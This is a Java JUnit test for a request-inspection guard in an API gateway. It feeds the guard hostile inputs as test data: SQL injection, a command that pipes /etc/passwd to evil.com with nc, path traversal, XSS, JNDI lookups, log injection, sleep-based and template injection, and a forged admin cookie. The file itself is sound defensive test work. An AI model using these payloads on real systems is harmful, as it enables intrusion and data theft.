package com.apisecurity.gateway.policy;

import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockHttpServletRequest;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;

public class ReviewRequestGuardTest {

    private final ReviewRequestGuard guard = new ReviewRequestGuard();

    @Test
    public void labPatternsMatchAndOrdinaryRequestsDoNot() {
        assertEquals(ReviewRequestGuard.SQL_STRUCTURE, rule(get("/api/books",
                "search=%27%20OR%20%271%27=%271%20--%20UNION%20SELECT%20*", null)));
        assertEquals(ReviewRequestGuard.COMMAND_CHAIN, rule(get("/api/books",
                "search=;%20cat%20/etc/passwd%20|%20nc%20evil.com%204444", null)));
        assertEquals(ReviewRequestGuard.COOKIE_AUTHORITY, rule(cookie(
                "admin=true; role=superadmin; token=malicious_forge_xyz")));
        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(get(
                "/api/books/..%2F..%2F..%2Fetc%2Fpasswd", null, null)));
        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(get(
                "/api/books/%252e%252e%252fetc", null, null)));
        assertEquals(ReviewRequestGuard.MARKUP_SCRIPT, rule(post(
                "{\"text\":\"<script>alert(\\\"xss\\\")</script><img src=x onerror=alert(1)>\"}")));
        assertEquals(ReviewRequestGuard.JNDI_LOOKUP, rule(post(
                "{\"text\":\"${jndi:ldap://example:1389/a}\"}")));
        assertEquals(ReviewRequestGuard.JNDI_LOOKUP, rule(post(
                "{\"text\":\"${  JnDi  :ldap://example}\"}")));
        assertEquals(ReviewRequestGuard.LOG_LINE, rule(post(
                "{\"text\":\"Normal text\\\\r\\\\n[2026-10-08 17:00:00] [CRITICAL] Admin granted root privileges\"}")));

        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(query("category=/etc/passwd")));
        assertEquals(ReviewRequestGuard.COMMAND_CHAIN, rule(query("category=cat%20/etc/passwd")));
        assertEquals(ReviewRequestGuard.COMMAND_CHAIN, rule(query("category=Technology%3Bsleep%2015.0%3B")));
        assertEquals(ReviewRequestGuard.COMMAND_CHAIN, rule(query("category=Technology%26sleep%2015.0%26")));
        assertEquals(ReviewRequestGuard.COMMAND_CHAIN, rule(query("category=Technology%3Bstart-sleep%20-s%2015.0")));
        assertEquals(ReviewRequestGuard.SQL_STRUCTURE, rule(query("category=pg_sleep(15)")));
        assertEquals(ReviewRequestGuard.SQL_STRUCTURE, rule(query("category=(DBMS_SESSION.SLEEP(15))")));
        assertEquals(ReviewRequestGuard.SQL_STRUCTURE, rule(query("category=Technology%20%2F%20sleep(15)%20")));
        assertEquals(ReviewRequestGuard.SQL_STRUCTURE, rule(query("category=%22java.lang.Thread.sleep%22(15000)")));
        assertEquals(ReviewRequestGuard.COMMAND_CHAIN, rule(query("category=%3C%25%3D%20global.process.mainModule.require(%27child_process%27).execSync(%27sleep%2015%27)%20%25%3E")));
        assertEquals(ReviewRequestGuard.COMMAND_CHAIN, rule(query("category=%7Bsystem(%22sleep%2015%22)%7D")));
        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(query("category=c%3A%5CWindows%5Csystem.ini")));
        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(query("category=c%3A%2FWindows%2Fsystem.ini")));
        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(query("category=WEB-INF%5Cweb.xml")));
        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(query("category=WEB-INF%2Fweb.xml")));
        assertEquals(ReviewRequestGuard.PATH_TRAVERSAL, rule(query("category=type%20%25SYSTEMROOT%25%5Cwin.ini")));

        assertNull(guard.inspect(get("/api/books", "search=protocol", null), ""));
        assertNull(guard.inspect(get("/api/books", "search=maths", null), ""));
        assertNull(guard.inspect(get("/api/books", "search=gateway&category=Technology", null), ""));
        assertNull(guard.inspect(get("/api/books", "search=anomaly", null), ""));
        assertNull(guard.inspect(get("/api/books", "category=Computer%20Science", null), ""));
        assertNull(guard.inspect(get("/api/books", "category=Technology", null), ""));
        assertNull(guard.inspect(get("/api/books", "category=All", null), ""));
        assertNull(guard.inspect(get("/api/books", "search=sleep", null), ""));
        assertNull(guard.inspect(get("/api/books", "ref=a+b;c", null), ""));
        assertNull(guard.inspect(get("/api/books", "search=C%2B%2B", null), ""));
        assertNull(guard.inspect(get("/api/comments/book/101", null, null), ""));
        assertNull(guard.inspect(get("/api/health", null, null), ""));
        assertNull(guard.inspect(get("/", null, null), ""));
        assertNull(guard.inspect(cookie("session=abc"), ""));
        assertNull(guard.inspect(post("{\"text\":\"I like this book.\"}"), ""));
        assertNull(guard.inspect(post("{\"text\":\"hello\\nworld\"}"), ""));

        MockHttpServletRequest testHeader = get("/api/books", null, null);
        testHeader.addHeader("X-Test-Case-Id", "${jndi:example}");
        assertNull(guard.inspect(testHeader, ""));
    }

    private String rule(MockHttpServletRequest request) {
        ReviewRequestGuard.Match match = guard.inspect(request,
                new String(request.getContentAsByteArray(), java.nio.charset.StandardCharsets.UTF_8));
        return match == null ? null : match.id;
    }

    private static MockHttpServletRequest query(String query) {
        return get("/api/books", query, null);
    }

    private static MockHttpServletRequest get(String path, String query, String ignored) {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", path);
        request.setRequestURI(path);
        if (query != null) {
            request.setQueryString(query);
        }
        request.setContent(new byte[0]);
        return request;
    }

    private static MockHttpServletRequest cookie(String value) {
        MockHttpServletRequest request = get("/api/books", null, null);
        request.addHeader("Cookie", value);
        return request;
    }

    private static MockHttpServletRequest post(String body) {
        MockHttpServletRequest request = new MockHttpServletRequest("POST", "/api/comments/book/101");
        request.setRequestURI("/api/comments/book/101");
        request.setContent(body.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        return request;
    }
}
